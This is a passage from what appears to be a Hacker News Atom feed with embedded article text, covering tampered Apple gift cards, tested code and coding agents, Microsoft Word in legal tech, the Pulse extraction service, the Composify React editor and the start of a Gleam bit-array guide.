free book on hypermedia-driven apps &lt;/p&gt;&lt;p&gt;1 Honor obliges me to admit this is not literally true. bettermotherfuckingwebsite.com is a fucking pedagogical masterpiece and reshaped how I built my own site. But let's not spoil the bit... ↩&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="http://pleasejusttryhtmx.com/"/><published>2025-12-18T14:18:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313061</id><title>Are Apple gift cards safe to redeem?</title><updated>2025-12-18T20:39:06.631795+00:00</updated><content>&lt;doc fingerprint="ed8cd82d13261155"&gt;
  &lt;main&gt;
    &lt;p&gt;By John Gruber&lt;/p&gt;
    &lt;p&gt;Finalist for iOS: A love letter to paper planners&lt;/p&gt;
    &lt;p&gt;You will recall the Apple Account fiasco of Paris Buttfield-Addison, whose entire iCloud account and library of iTunes and App Store media purchases were lost when his Apple Account was locked, seemingly after he attempted to redeem a tampered $500 Apple Gift Card that he purchased from a major retailer. I wrote about it, as did Michael Tsai, Nick Heer, Malcom Owen at AppleInsider, and Brandon Vigliarolo at The Register. Buttfield-Addison has updated his post a few times, including a note that Executive Relations — Apple’s top-tier support SWAT team — was looking into the matter. To no avail, at least yet, alas.&lt;/p&gt;
    &lt;p&gt;Adam Engst, writing at TidBITS today:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;There is one way the Apple community could exert some leverage over Apple. Since innocently redeeming a compromised Apple Gift Card can have serious negative consequences, we should all avoid buying Apple Gift Cards and spread the word as widely as possible that they could essentially be malware. Sure, most Apple Gift Cards are probably safe, but do you really want to be the person who gives a close friend or beloved grandchild a compromised card that locks their Apple Account? And if someone gives you one, would you risk redeeming it? It’s digital Russian roulette.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;I suspect that one part of Buttfield-Addison’s fiasco is the fact that his seemingly problematic gift card was for $500, not a typical amount like $25, but that’s just a suspicion on my part. We don’t know — because key to the Kafka-esque nature of the whole nightmare is that his account cancellation was a black box. Not only has Apple not yet restored his deactivated Apple Account, at no point in the process have they explained why it was deactivated in the first place. We’re left to guess that it was related to the tampered gift card and that the relatively high value of the card in question was related. $500 is a higher value than average for an Apple gift card, but that amount is less than the average price for a single iPhone. Apple itself sets a limit of $2,000 on gift cards in the US, so $500 shouldn’t be considered an inherently suspicious amount.&lt;/p&gt;
    &lt;p&gt;The whole thing does make me nervous about redeeming, or giving, Apple gift cards. Scams in general seem to be getting more sophisticated. Buttfield-Addison says he bought the card directly from “a major brick-and-mortar retailer (Australians, think Woolworths scale; Americans, think Walmart scale)”. Until we get some clarity on this I feel like I’d only redeem Apple gift cards at an Apple retail store, for purchases not tied to my Apple Accounts. (I’ve still got two — one for iCloud, one for media purchases.)&lt;/p&gt;
    &lt;p&gt;In addition to the uncertainty this leaves us with regarding the redemption of Apple gift cards, I have to wonder what the hell happens to these Apple Accounts that are deactivated for suspected fraud. You would think that once escalated high enough in Apple’s customer support system, someone at Apple could just flip a switch and re-activate the account. The fact that Buttfield-Addison’s account has not yet been restored, despite the publicity and apparent escalation to Executive Relations, makes me think it can’t be restored. I don’t know how that can be, but it sure seems like that’s the case. Darth Vader’s “And no disintegrations” admonition ought to be in effect for something like this. I have the sinking feeling that the best Apple is able to do is something seemingly ridiculous, like refund Buttfield-Addison for every purchase he ever made on the account and tell him to start over with a new one.&lt;/p&gt;
    &lt;p&gt;My other question: Were any humans involved in the decision to deactivate (disintegrate?) his account, or was it determined purely by some sort of fraud detection algorithm?&lt;/p&gt;
    &lt;p&gt;Update: Very shortly after I posted the above, Buttfield-Addison posted an update that his account was successfully restored by the ninja on Apple’s Executive Relations team assigned to his case. That’s great. But that still leaves the question of how safe Apple gift cards are to redeem on one’s Apple Account. It also leaves the question of how this happened in the first place, and why it took the better part of a week to resolve.&lt;/p&gt;
    &lt;p&gt;★ Wednesday, 17 December 2025&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://daringfireball.net/linked/2025/12/17/are-apple-gift-cards-safe-to-redeem"/><published>2025-12-18T14:26:57+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313297</id><title>Your job is to deliver code you have proven to work</title><updated>2025-12-18T20:39:06.456736+00:00</updated><content>&lt;doc fingerprint="a640485769051507"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Your job is to deliver code you have proven to work&lt;/head&gt;
    &lt;p&gt;18th December 2025&lt;/p&gt;
    &lt;p&gt;In all of the debates about the value of AI-assistance in software development there’s one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers—or open source maintainers—and expects the “code review” process to handle the rest.&lt;/p&gt;
    &lt;p&gt;This is rude, a waste of other people’s time, and is honestly a dereliction of duty as a software developer.&lt;/p&gt;
    &lt;p&gt;Your job is to deliver code you have proven to work.&lt;/p&gt;
    &lt;p&gt;As software engineers we don’t just crank out code—in fact these days you could argue that’s what the LLMs are for. We need to deliver code that works—and we need to include proof that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.&lt;/p&gt;
    &lt;head rend="h4"&gt;How to prove it works&lt;/head&gt;
    &lt;p&gt;There are two steps to proving a piece of code works. Neither is optional.&lt;/p&gt;
    &lt;p&gt;The first is manual testing. If you haven’t seen the code do the right thing yourself, that code doesn’t work. If it does turn out to work, that’s honestly just pure chance.&lt;/p&gt;
    &lt;p&gt;Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.&lt;/p&gt;
    &lt;p&gt;If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here’s a recent example.&lt;/p&gt;
    &lt;p&gt;Some changes are harder to demonstrate. It’s still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.&lt;/p&gt;
    &lt;p&gt;Once you’ve tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.&lt;/p&gt;
    &lt;p&gt;The second step in proving a change works is automated testing. This is so much easier now that we have LLM tooling, which means there’s no excuse at all for skipping this step.&lt;/p&gt;
    &lt;p&gt;Your contribution should bundle the change with an automated test that proves the change works. That test should fail if you revert the implementation.&lt;/p&gt;
    &lt;p&gt;The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.&lt;/p&gt;
    &lt;p&gt;Don’t be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I’ve done this myself I’ve quickly regretted it.&lt;/p&gt;
    &lt;head rend="h4"&gt;Make your coding agent prove it first&lt;/head&gt;
    &lt;p&gt;The most important trend in LLMs in 2025 has been the explosive growth of coding agents—tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.&lt;/p&gt;
    &lt;p&gt;To master these tools you need to learn how to get them to prove their changes work as well.&lt;/p&gt;
    &lt;p&gt;This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.&lt;/p&gt;
    &lt;p&gt;Since they’re robots, automated tests and manual tests are effectively the same thing.&lt;/p&gt;
    &lt;p&gt;They do feel a little different though. When I’m working on CLI tools I’ll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like Click’s CLIRunner.&lt;/p&gt;
    &lt;p&gt;When working on CSS changes I’ll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.&lt;/p&gt;
    &lt;p&gt;The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They’ll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.&lt;/p&gt;
    &lt;p&gt;Developing good taste in testing code is another of those skills that differentiates a senior engineer.&lt;/p&gt;
    &lt;head rend="h4"&gt;The human provides the accountability&lt;/head&gt;
    &lt;p&gt;A computer can never be held accountable. That’s your job as the human in the loop.&lt;/p&gt;
    &lt;p&gt;Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That’s no longer valuable. What’s valuable is contributing code that is proven to work.&lt;/p&gt;
    &lt;p&gt;Next time you submit a PR, make sure you’ve included your evidence that it works as it should.&lt;/p&gt;
    &lt;head rend="h2"&gt;More recent articles&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Gemini 3 Flash - 17th December 2025&lt;/item&gt;
      &lt;item&gt;I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours - 15th December 2025&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/"/><published>2025-12-18T14:52:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313518</id><title>The immortality of Microsoft Word</title><updated>2025-12-18T20:39:06.031977+00:00</updated><content>&lt;doc fingerprint="7034bb295bf46698"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;On the Immortality of Microsoft Word&lt;/head&gt;
    &lt;head rend="h3"&gt;And why tech people refuse to accept it&lt;/head&gt;
    &lt;p&gt;Lawyers and legal tech procurers often feel that vendors don’t ‘get it.’ They don’t understand what lawyers need and they build solutions for problems that lawyers don’t have. A tsunami of venture capital in the space has only amplified this dynamic. If you’ve spent time in r/legaltech in recent months, you’re surely aware of the shared frustration by both lawyers and legal tech procurers that this new crop of legal AI companies have over-promised and under-delivered.&lt;/p&gt;
    &lt;p&gt;Why is it easier for tech people to build machines that emulate human intelligence than it is for them to build software for lawyers that delivers value? As a software engineer who has spent the past five years working in legal tech, I have observed several patterns in products that miss the mark and in my own thinking that I believe explain the disconnect between lawyers and legal tech vendors.&lt;/p&gt;
    &lt;p&gt;My conclusion is that coders misunderstand legal workflows and that their misunderstanding is upstream of many mistakes in legal tech.&lt;/p&gt;
    &lt;p&gt;Of all the mistakes this misunderstanding produces, one stands above the rest—the desire to replace Microsoft Word.&lt;/p&gt;
    &lt;p&gt;Microsoft Word can never be replaced. OpenAI could build superintelligence surpassing human cognition in every conceivable dimension, rendering all human labor obsolete, and Microsoft Word will survive. Future contracts defining the land rights to distant galaxies will undoubtedly be drafted in Microsoft Word.&lt;/p&gt;
    &lt;p&gt;Microsoft Word is immortal.&lt;/p&gt;
    &lt;p&gt;Why?&lt;/p&gt;
    &lt;p&gt;Legal systems around the world run on it. Microsoft Word is the only word processor on the market that meets lawyer’s technical requirements. Furthermore, its file format, docx, is the network protocol that underpins all legal agreements in society. Replacing Microsoft Word is untenable and attempts to do so deeply misunderstand the role that it plays in lawyers’ workflows.&lt;/p&gt;
    &lt;p&gt;The origin of this misunderstanding can be traced to a common myth shared by coders — “The Fall of Legal Tech.”&lt;/p&gt;
    &lt;head rend="h3"&gt;Legal tech’s original sin&lt;/head&gt;
    &lt;p&gt;Throughout history, ancient cultures across the world developed myths about the creation and fall of mankind that mirror one another. So too do coders, drawing from the collective unconscious of the coder hive-mind, invent the myth of “The Fall of Legal Tech”. They mistakenly conclude that Microsoft Word is legal tech’s original sin and only its replacement will lead lawyers to salvation.&lt;/p&gt;
    &lt;p&gt;They have a variety of ideas of what form its successor will take. Some imagine it’s Google Docs. Others believe it will be their product’s proprietary rich text editor. The coders most committed to the ideals of technical elegance, however, propose that Markdown, a computer language for encoding formatted text, shall take its place.&lt;/p&gt;
    &lt;p&gt;Markdown is ubiquitous amongst coders. It allows them to encode document formatting in “plaintext”. Special characters encode its text so that applications can render it with visual formatting. For example, to indicate that text should be italicized, Markdown wraps it in asterisks. E.g. *This text will be italic* -&amp;gt; this text will be italic.&lt;/p&gt;
    &lt;p&gt;Below is an example of a simple Markdown document with its written form on the left and its rendered form on the right.&lt;/p&gt;
    &lt;p&gt;Why do coders want lawyers to use Markdown instead of Microsoft Word? Because Markdown is compatible with git, the version control system that structures their workflow. If lawyers could use git-like version control, so many problems in the legal workflow could be solved. It’s why we’ve spent years building such a system for lawyers. Let’s get into why Markdown is not legal tech’s savior.&lt;/p&gt;
    &lt;head rend="h1"&gt;Formatting&lt;/head&gt;
    &lt;p&gt;Markdown doesn’t work because of formatting. “But Markdown supports formatting!” the coder cries. That is, in fact, its whole point — the raison d’etre of Markdown is to encode formatting in text. Isn’t that enough?&lt;/p&gt;
    &lt;p&gt;Well yes, Markdown supports certain formatting. It supports bold, italics, numbered lists, ordered lists, headings, tables, etc. But what happens when a lawyer wants to style their headings in “small caps”, as my lawyer cofounder Kevin insists? Okay, perhaps we can add that formatting option to Markdown as well. But what happens when a law firm needs their documents to use multi-level decimal clause numbering like in the below screenshot?&lt;/p&gt;
    &lt;p&gt;Or how about when we need to specify the precise width of a column in a table that differs from the width of the other columns or split a particular cell to contain additional rows that other cells don’t?&lt;/p&gt;
    &lt;p&gt;Sure, we could theoretically encode that rule too and all other formatting rules until we’ve accounted for all of the formatting possibilities that lawyers actively use. By that point, however, we will have effectively recreated Microsoft Word but in a format that is significantly more challenging to use.&lt;/p&gt;
    &lt;head rend="h3"&gt;“But style doesn’t matter!”&lt;/head&gt;
    &lt;p&gt;Surely, many coders who have read up until this point are thinking the following objection: why do lawyers need all of those extra formatting options? The styling properties of lists don’t matter – all that matters is the information they convey.&lt;/p&gt;
    &lt;p&gt;Herein lies a cultural difference between the fields of coding and lawyering. For coders, visual aesthetics don’t matter. For lawyers, they are a technical requirement. While this difference may seem arbitrary on the surface, it is downstream of a critical technical difference between the two fields. Machines interpret the work of coders. Human institutions interpret the work of lawyers.&lt;/p&gt;
    &lt;p&gt;Concretely, visual presentation doesn’t matter for code beyond basic legibility because a machine ultimately executes the code. Courts interpret legal contracts, by contrast, and courts often have specific formatting guidelines that Markdown and other non-Word alternatives do not satisfy.&lt;/p&gt;
    &lt;p&gt;For example: federal appellate courts require all “briefs, appendices, and other papers” to adhere to the following formatting conventions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;14-point proportional typeface is mandatory, and Markdown cannot specify font size or font family.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Double-spacing for all text, with narrow exceptions for block quotes and headings. Markdown has no concept of line-spacing rules.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Precise margin requirements (at least one-inch on all sides) and 8.5×11-inch page size, which Markdown cannot express.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Roman-numeral and Arabic page-numbering schemes, footers, and separate formatting for cover pages, none of which Markdown can natively encode.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Additionally, a well-formatted document is a symbol of a lawyer’s professionalism. Courts aren’t the only readers of legal documents. Clients, counterparties, colleagues, all read a lawyer’s documents as well. The style of their work product reflects the lawyer’s professionalism — the medium is the message.&lt;/p&gt;
    &lt;head rend="h1"&gt;Docx is a protocol, not a filetype&lt;/head&gt;
    &lt;p&gt;Beyond styling considerations, another structural consideration of the legal workflow prevents Microsoft Word’s defenestration — the legal system is decentralized.&lt;/p&gt;
    &lt;p&gt;If a coder wants to adopt a new file format for their internal documentation or new programming language, they can rewrite the relevant parts of their codebase. They are able to do so by virtue of having autonomy over the system they operate. While this becomes more complex in an engineering organization, the principle remains that the organization has the necessary autonomy to change its systems.&lt;/p&gt;
    &lt;p&gt;In the legal world, a lawyer cannot simply choose to adopt a new file format. This is because all existing legal precedent is in the old format. Docx encodes virtually every outstanding legal commitment for every person and corporation in our society. A lawyer could choose to adopt a new file format, but the system will break when they need to redline it against precedent.&lt;/p&gt;
    &lt;p&gt;Additionally, every colleague, counterparty, outside-counsel, and client a lawyer ever works with uses docx. To introduce a new format into this ecosystem would introduce friction into every single interaction. If a lawyer sends a contract in Markdown, the counterparty cannot redline it. If they send a link to a proprietary cloud editor, the client cannot file it in their internal document management system. In the legal industry, asking a client to learn a new tool to accommodate your workflow is a non-starter.&lt;/p&gt;
    &lt;p&gt;An appropriate technical analogy for docx is a network protocol. A coder cannot just decide to stop serving their web application over HTTP. Doing so would disconnect their application from the web and render it useless. The same goes for lawyers vis-a-vis docx. Docx is a protocol for defining legal commitments across a decentralized network of legal entities. Opting out of that system is not viable if the lawyer wants to stay in business.&lt;/p&gt;
    &lt;p&gt;This dynamic explains why legal tech products fail when they force lawyers to use a document editor outside of Microsoft Word. They attempt to introduce a walled-garden platform in an industry that runs on an open protocol. When a tech product requires both sides of a transaction to be on the same platform to collaborate effectively, it breaks the protocol. Until a startup can convince the entire global legal market to switch software simultaneously, .docx remains the only viable packet for transferring legal data.&lt;/p&gt;
    &lt;head rend="h1"&gt;How to innovate in legal tech&lt;/head&gt;
    &lt;p&gt;Accepting Microsoft Word’s primacy in the legal workflow is not technological defeatism. Progress shall continue! But impactful innovation in legal tech requires contending with Microsoft Word. Moreover, it requires cultivating a deep understanding of the practice of law beyond a surface-level recognition of the similarities between coders and lawyers.&lt;/p&gt;
    &lt;p&gt;At Version Story, this understanding originates from our lawyer/coder CEO, Kevin O’Connell. His experience in both fields has given us a unique vantage point in the industry, allowing us to understand the legal workflow as it exists while imagining what it can become. That vantage point has been critical in building a version control and redlining product that lawyers love.&lt;/p&gt;
    &lt;p&gt;If more coders and technologists learn the way lawyers actually work, we can expect a future with innovative legal technology that truly adds value. Not revolutions, not ChatGPT wrappers promising to remove lawyering from the practice of law, but meaningful step-changes that help lawyers to spend more time exercising legal judgment and less time wrangling documents.&lt;/p&gt;
    &lt;p&gt;Legal tech never fell. It doesn’t need full-stop salvation. It needs good products built by people who understand lawyers.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://theredline.versionstory.com/p/on-the-immortality-of-microsoft-word"/><published>2025-12-18T15:11:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313899</id><title>Finland gave two groups identical payments – one saw better mental health</title><updated>2025-12-18T20:39:05.884779+00:00</updated><content/><link href="https://scottsantens.substack.com/p/finland-basic-income-experiment-mental-health-ubi"/><published>2025-12-18T15:34:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313930</id><title>Launch HN: Pulse (YC S24) – Production-grade unstructured document extraction</title><updated>2025-12-18T20:39:05.478871+00:00</updated><content>&lt;doc fingerprint="631726296fa45fcb"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN, we’re Sid and Ritvik, co-founders of Pulse (&lt;/p&gt;https://www.runpulse.com/&lt;p&gt;). Pulse is a document extraction system to create LLM-ready text using hybrid VLM + OCR models.&lt;/p&gt;&lt;p&gt;Here’s a demo video: https://video.runpulse.com/video/pulse-platform-walkthrough-....&lt;/p&gt;&lt;p&gt;Later in this post, you’ll find links to before-and-after examples on particularly tricky cases. Check those out to see what Pulse can really do! Modern vision language models are great at producing plausible text, but that makes them risky for OCR and data ingestion. Plausibility isn’t good enough when you need accuracy.&lt;/p&gt;&lt;p&gt;When we started working on document extraction, we assumed the same thing many teams do: foundation models are improving quickly, multi-modal systems appear to read documents well, what’s not to like? And indeed, for small or clean inputs, those assumptions mostly give good results. However, limitations show up once you begin processing real documents in volume. Long PDFs, dense tables, mixed layouts, low-fidelity scans, and financial or operational data expose errors that are subtle, hard to detect, and expensive to correct. Outputs look reasonable even though they contain small but important mistakes, especially in tables and numeric fields.&lt;/p&gt;&lt;p&gt;Running into those challenges got us working. We ran controlled evaluations on complex documents, fine tuned vision models, and built labeled datasets where ground truth actually matters. There have been many nights where our team stayed up hand-annotating pages, drawing bounding boxes around tables, labeling charts point by point, or debating whether a number was unreadable or simply poorly scanned. That process shaped our intuition far more than benchmarks.&lt;/p&gt;&lt;p&gt;One thing became clear quickly. The core challenge is not extraction itself, but confidence. Vision language models embed document images into high-dimensional representations optimized for semantic understanding, not precise transcription. That process is inherently lossy. When uncertainty appears, models tend to resolve it using learned priors instead of surfacing ambiguity. This behavior can be helpful in consumer settings. In production pipelines, it creates verification problems that do not scale well. Pulse grew out of our trying to address this gap through system design rather than prompting alone.&lt;/p&gt;&lt;p&gt;Instead of treating document understanding as a single generative step, our system separates layout analysis from language modeling. Documents are normalized into structured representations that preserve hierarchy and tables before schema mapping occurs. Extraction is constrained by schemas defined ahead of time, and extracted values are tied back to source locations so uncertainty can be inspected rather than guessed away. In practice, this results in a hybrid approach that combines traditional computer vision techniques, layout models, and vision language models, because no single approach handles these cases reliably on its own.&lt;/p&gt;&lt;p&gt;We are intentionally sharing a few documents that reflect the types of inputs that motivated this work. These are representative of cases where we saw generic OCR or VLM-based pipelines struggle.&lt;/p&gt;&lt;p&gt;Here is a financial 10K: https://platform.runpulse.com/dashboard/examples/example1&lt;/p&gt;&lt;p&gt;Here is a newspaper: https://platform.runpulse.com/dashboard/examples/example2&lt;/p&gt;&lt;p&gt;Here is a rent roll: https://platform.runpulse.com/dashboard/examples/example3&lt;/p&gt;&lt;p&gt;Pulse is not perfect, particularly on highly degraded scans or uncommon handwriting, and we’re working on improvements. However, our goal is not to eliminate errors entirely, but to make them visible, auditable, and easier to reason about.&lt;/p&gt;&lt;p&gt;Pulse is available via usage-based access to the API and platform You can sign up to try it at https://platform.runpulse.com/login. API docs are at https://docs.runpulse.com/introduction.&lt;/p&gt;&lt;p&gt;We’d love to hear how others here evaluate correctness for document extraction, which failure modes you have seen in practice, and what signals you rely on to decide whether an output can be trusted.&lt;/p&gt;&lt;p&gt;We will be around to answer questions and are happy to run additional documents if people want to share examples. Put links in the comments and we’ll plug them in and get back to you.&lt;/p&gt;&lt;p&gt;Looking forward to your comments!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46313930"/><published>2025-12-18T15:35:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313991</id><title>Beginning January 2026, all ACM publications will be made open access</title><updated>2025-12-18T20:39:05.233515+00:00</updated><content/><link href="https://dl.acm.org/openaccess"/><published>2025-12-18T15:39:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46314385</id><title>Show HN: Composify – Open-Source Visual Editor / Server-Driven UI for React</title><updated>2025-12-18T20:39:04.731758+00:00</updated><content>&lt;doc fingerprint="b45bb270bb103788"&gt;
  &lt;main&gt;
    &lt;p&gt;Composify is an open-source library that adds a visual editor to your React application. It lets non-developers build pages using your existing production components, so engineers can focus on actual feature work.&lt;/p&gt;
    &lt;p&gt;Most visual builders force you into a binary choice: use a rigid page builder with generic components (Wix, Squarespace) or adopt a complex headless CMS that requires modifying your code to fit their platform (Builder.io, Puck, Storyblok).&lt;/p&gt;
    &lt;p&gt;Composify sits in the middle. It is a visual interface for your actual component code. Register your components once, and anyone on your team can use them to build pages visually. Your design system stays intact. Marketing and content teams compose pages without filing tickets.&lt;/p&gt;
    &lt;p&gt;It's just a React library. Works with Next.js, Remix, or any React environment. You own your data.&lt;/p&gt;
    &lt;p&gt;Check out the live demo to see it in action.&lt;/p&gt;
    &lt;code&gt;# npm
$ npm install @composify/react --save

# pnpm
$ pnpm add @composify/react

# yarn
$ yarn add @composify/react&lt;/code&gt;
    &lt;p&gt;Before you can use a component in the &lt;code&gt;Editor&lt;/code&gt; or &lt;code&gt;Renderer&lt;/code&gt;, you need to register it in the &lt;code&gt;Catalog&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;// catalog.tsx
import { Catalog } from '@composify/react/renderer';

const Text = ({ textAlign, children }) =&amp;gt; (
  &amp;lt;p style={{ textAlign }}&amp;gt;{children}&amp;lt;/p&amp;gt;
);

Catalog.register('Text', {
  component: Text,
  props: {
    textAlign: {
      label: 'Text Align',
      type: 'radio',
      options: [
        { label: 'Left', value: 'left' },
        { label: 'Center', value: 'center' },
        { label: 'Right', value: 'right' },
      ],
      default: 'left',
    },
    children: {
      label: 'Text',
      type: 'string',
      default: 'Hello, world!',
    },
  },
});&lt;/code&gt;
    &lt;p&gt;Important: Import this catalog file at your app's entry point (like &lt;code&gt;index.tsx&lt;/code&gt; or &lt;code&gt;_app.tsx&lt;/code&gt;) so the registration happens before the app renders.&lt;/p&gt;
    &lt;p&gt;Once registered, you can render JSX from a string using the &lt;code&gt;Renderer&lt;/code&gt; component:&lt;/p&gt;
    &lt;code&gt;// page.tsx
import { Renderer } from '@composify/react/renderer';

const source = `
  &amp;lt;div&amp;gt;
    &amp;lt;h1&amp;gt;Welcome to Composify!&amp;lt;/h1&amp;gt;
    &amp;lt;Text textAlign="center"&amp;gt;This is a simple example.&amp;lt;/Text&amp;gt;
  &amp;lt;/div&amp;gt;
`;

export const Page = () =&amp;gt; (
  &amp;lt;Renderer source={source} /&amp;gt;
);&lt;/code&gt;
    &lt;p&gt;To let users edit the content, use the &lt;code&gt;Editor&lt;/code&gt; component:&lt;/p&gt;
    &lt;code&gt;// editor.tsx
import { Editor } from '@composify/react/editor';
import '@composify/react/style.css';

const source = `
  &amp;lt;div&amp;gt;
    &amp;lt;h1&amp;gt;Welcome to Composify!&amp;lt;/h1&amp;gt;
    &amp;lt;Text textAlign="center"&amp;gt;This is a simple example.&amp;lt;/Text&amp;gt;
  &amp;lt;/div&amp;gt;
`;

export const Page = () =&amp;gt; (
  &amp;lt;Editor title="My Page" source={source} onSubmit={console.log} /&amp;gt;
);&lt;/code&gt;
    &lt;p&gt;Users can drag and drop components, modify props via the sidebar, and nest elements. Upon save, the editor serializes the tree back into a clean JSX string.&lt;/p&gt;
    &lt;p&gt;We built Composify to solve a common problem. Engineers build component libraries, but only engineers can use them effectively.&lt;/p&gt;
    &lt;p&gt;Most apps ship with a hard-coded UI. Even small tweaks require a full redeploy. With Composify, your UI lives on the server. Change it there, and it's live everywhere, instantly. No CI/CD, no app store reviews, no waiting.&lt;/p&gt;
    &lt;p&gt;Big tech does this already. Airbnb has Ghost Platform. Yelp built CHAOS. Lyft and Shopify have their own SDUI systems. Composify gives you that same power without the in-house infrastructure.&lt;/p&gt;
    &lt;p&gt;In most companies, small UI tweaks end up in the engineering backlog. Marketing wants to launch a promo. Content editors want to tweak a landing page. The ops team is running a seasonal campaign.&lt;/p&gt;
    &lt;p&gt;With Composify, the roles become clear:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Engineers focus on what they do best: building robust, reusable components&lt;/item&gt;
      &lt;item&gt;Non-developers use the visual editor to bring those components to life&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Want to test a different page layout for a user segment? Or prototype a feature directly in production? Swap out page structures, personalize onboarding flows, test new CTAs. It all happens server-side. No redeploys. No branching strategies.&lt;/p&gt;
    &lt;p&gt;Traditional CMSs lock you into themes and templates. You end up rebuilding your design system inside a clunky page builder, and the result never quite matches your actual app.&lt;/p&gt;
    &lt;p&gt;With Composify, content teams use the same components that power your core product. What they edit is exactly what ships.&lt;/p&gt;
    &lt;p&gt;More details on use cases in the documentation.&lt;/p&gt;
    &lt;p&gt;The open-source library gives you the engine (Editor and Renderer). Building the car (database, API, version history, collaboration) takes time.&lt;/p&gt;
    &lt;p&gt;Composify Cloud is the infrastructure layer for teams that want the benefits without maintaining the backend:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Managed hosting - No infrastructure to manage, unlimited bandwidth&lt;/item&gt;
      &lt;item&gt;Real-time collaboration - Multiple team members can edit the same page simultaneously&lt;/item&gt;
      &lt;item&gt;Version history - Time-travel through changes and restore previous versions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Full documentation is available at composify.js.org/docs.&lt;/p&gt;
    &lt;p&gt;We welcome contributions. Whether you're fixing bugs, adding features, or improving docs, pull requests and issues are always welcome.&lt;/p&gt;
    &lt;p&gt;This project is licensed under the Elastic License 2.0. Free to use for most cases, with some restrictions on offering Composify as a hosted service. See the license file for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/composify-js/composify"/><published>2025-12-18T16:02:29+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46314947</id><title>Making the most of bit arrays in Gleam</title><updated>2025-12-18T20:39:04.490276+00:00</updated><content>&lt;doc fingerprint="b6f6cb302b052264"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Making the Most of Bit Arrays&lt;/head&gt;
    &lt;head rend="h2"&gt;18 December, 2025&lt;/head&gt;
    &lt;p&gt;Gleam has a special piece of syntax that most other languages don't: Bit arrays. Taken from Erlang, bit array syntax allows the constructing and pattern matching on binary data. Bit arrays are extremely powerful, but unfortunately the documentation is a little sparse. It lists all the possible options you can use, as well as linking to the Erlang documentation for further reading, but the syntax isn't exactly the same as on Erlang, so there's some ambiguity as to how it exactly works. To make it easier, I wanted to write a comprehensive guide, to make it as easy as possible to understand how they work.&lt;/p&gt;
    &lt;head rend="h3"&gt;Table of contents&lt;/head&gt;
    &lt;head rend="h2"&gt;The basics&lt;/head&gt;
    &lt;p&gt;Bit arrays are delimited by double angle brackets (&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;), and contain zero
or more segments, separated by commas. A segment is a value which is encoded
somehow as a sequence of bits. They have no actual separation other than syntactically,
they are just a way of building up a bit array out of various different parts.&lt;/p&gt;
    &lt;p&gt;A segment consists of a value, followed by a series of options using the syntax &lt;code&gt;value:option1-option2-option3&lt;/code&gt;.&lt;/p&gt;
